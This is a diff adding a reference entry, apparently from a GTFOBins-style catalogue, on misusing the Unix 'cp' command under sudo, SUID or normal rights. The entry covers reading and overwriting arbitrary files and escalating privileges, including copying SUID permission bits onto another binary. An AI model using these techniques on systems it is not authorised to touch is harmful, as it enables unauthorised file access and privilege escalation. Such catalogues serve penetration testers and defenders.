@@ -1,0 +1,45 @@
+cp
+==
+
+File read
+---------
+
+[Sudo]
+    cp /path/to/input-file /dev/stdout
+
+[SUID]
+    cp /path/to/input-file /dev/stdout
+
+[Unprivileged]
+    cp /path/to/input-file /dev/stdout
+
+File write
+----------
+
+[Sudo]
+    echo DATA | cp /dev/stdin /path/to/output-file
+
+[SUID]
+    echo DATA | cp /dev/stdin /path/to/output-file
+
+[Unprivileged]
+    echo DATA | cp /dev/stdin /path/to/output-file
+
+Privilege Escalation
+--------------------
+
+[Sudo]
+    cp /path/to/input-file /path/to/output-file
+    This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)
+
+[SUID]
+    cp /path/to/input-file /path/to/output-file
+    This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)
+
+[Sudo]
+    cp --attributes-only --preserve=all /path/to/input-file /path/to/output-file
+    This can copy SUID permissions from any SUID binary (e.g., `/path/to/input-file`) to another.
+
+[SUID]
+    cp --attributes-only --preserve=all /path/to/input-file /path/to/output-file
+    This can copy SUID permissions from any SUID binary (e.g., `/path/to/input-file`) to another.
